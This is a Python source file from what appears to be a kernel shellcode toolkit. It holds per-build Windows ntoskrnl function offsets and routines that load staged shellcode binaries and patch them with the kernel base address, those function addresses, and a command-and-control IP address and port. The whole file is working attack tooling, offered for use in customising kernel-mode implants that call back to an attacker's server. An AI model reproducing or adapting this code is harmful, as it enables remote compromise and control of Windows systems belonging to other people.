from kernel_shellcode_library.customize_shellcode import modify


funcs_pi_addresses_by_ver = {
    "19041.1415": {
        "mm_allocate_contiguous_memory": 0x52c210,
        "mm_map_io_space": 0x335ae0,
        "ps_create_system_thread": 0x6cfb90
    },
    "19044.1706": {
        "mm_allocate_contiguous_memory": 0x52c980,
        "mm_map_io_space": 0x318320,
        "ps_create_system_thread": 0x6428f0
    },
    "19044.1889": {
        "mm_allocate_contiguous_memory": 0x52c480,
        "mm_map_io_space": 0x2064a0,
        "ps_create_system_thread": 0x6cedd0
    },
    "19044.2006": {
        "mm_allocate_contiguous_memory": 0x52c760,
        "mm_map_io_space": 0x3242d0,
        "ps_create_system_thread": 0x653890
    },
    "19044.2130": {
        "mm_allocate_contiguous_memory": 0x52c830,
        "mm_map_io_space": 0x3242d0,
        "ps_create_system_thread": 0x6555d0
    },
    "19044.2364": {
        "mm_allocate_contiguous_memory": 0x52ed50,
        "mm_map_io_space": 0x3245c0,
        "ps_create_system_thread": 0x6586d0,
        "psp_create_process": 0x7c4fb0,
        "nt_create_user_process": 0x6764a0,
        "zw_create_worker_factory": 0x3f7110,
        "zw_set_information_worker_factory": 0x3f8b70
    },
    "19044.2486": {
        "mm_allocate_contiguous_memory": 0x52ec40,
        "mm_map_io_space": 0x31a520,
        "ps_create_system_thread": 0x6ffc80,
        "zw_create_worker_factory": 0x3f8040,
        "zw_set_information_worker_factory": 0x3f9aa0
    }
}

payloads_dir = "/usr/src/app/kernel_shellcode_library/payloads/"

profiles = {
    "first_stage": {
        "first_stage_default": payloads_dir + "first_stage_default.bin"
    },
    "second_stage": {
        "second_stage_default": payloads_dir + "second_stage_default.bin",
        "second_stage_with_usermode": payloads_dir + "second_stage_with_usermode.bin"
    },
}


def read_first_stage(config):
    profile = config['first_stage_profile']
    if profile not in profiles['first_stage']:
        raise NotImplementedError
    shellcode_file = profiles['first_stage'][profile]
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    return shellcode


def read_second_stage(config):
    profile = config['second_stage_profile']
    if profile not in profiles['second_stage']:
        raise NotImplementedError
    shellcode_file = profiles['second_stage'][profile]
    with open(shellcode_file, 'rb') as f:
        shellcode = f.read()
    return shellcode


def patch_first_stage(sh_offsets, config, shellcode, ntoskrnl_base_addr_hex):
    # each first stage should have, defined in offsets, the fields as the default (in offsets.json)
    # TODO: possibility of patching first-stage egg?
    version = '.'.join([config['win_major_version'], config['win_minor_version']])
    if version not in funcs_pi_addresses_by_ver:
        raise NotImplementedError
    if ntoskrnl_base_addr_hex.startswith("0x"):
        ntoskrnl_base_addr_hex = ntoskrnl_base_addr_hex[2:]
    addr_offset = sh_offsets["ntoskrnl_base_addr"]
    shellcode = modify(addr_offset, ntoskrnl_base_addr_hex, shellcode, swap_bytes=True)
    for func_name in sh_offsets["hardcoded_function_offsets"]:
        func_offset = sh_offsets["hardcoded_function_offsets"][func_name]
        try:
            func_pi_address = funcs_pi_addresses_by_ver[version][func_name]
        except KeyError:
            raise NotImplementedError
        addr = hex(func_pi_address)[2:]
        shellcode = modify(func_offset, addr, shellcode, swap_bytes=True)
    return shellcode


def patch_second_stage(sh_offsets, config, shellcode, ntoskrnl_base_addr_hex):
    # each second stage should have, defined in offsets, the fields as the default (in offsets.json)
    if ntoskrnl_base_addr_hex.startswith("0x"):
        ntoskrnl_base_addr_hex = ntoskrnl_base_addr_hex[2:]
    addr_offset = sh_offsets["ntoskrnl_base_addr"]
    shellcode = modify(addr_offset, ntoskrnl_base_addr_hex, shellcode, swap_bytes=True)
    ip = config["c2_ip"]
    ip_addr_hex = "".join([hex(int(i))[2:].rjust(2, '0') for i in ip.split(".")])
    ip_offset = sh_offsets["c2_ip"]
    shellcode = modify(ip_offset, ip_addr_hex, shellcode, swap_bytes=False)
    port = config["c2_port"]
    port_hex = hex(port)[2:].rjust(4, '0')
    port_offset = sh_offsets["c2_port"]
    shellcode = modify(port_offset, port_hex, shellcode, swap_bytes=False)
    if "hardcoded_function_offsets" in sh_offsets:
        version = '.'.join([config['win_major_version'], config['win_minor_version']])
        if version not in funcs_pi_addresses_by_ver:
            raise NotImplementedError
        for func_name in sh_offsets["hardcoded_function_offsets"]:
            func_offset = sh_offsets["hardcoded_function_offsets"][func_name]
            try:
                func_pi_address = funcs_pi_addresses_by_ver[version][func_name]
            except KeyError:
                raise NotImplementedError
            addr = hex(func_pi_address)[2:]
            shellcode = modify(func_offset, addr, shellcode, swap_bytes=True)
    return shellcode
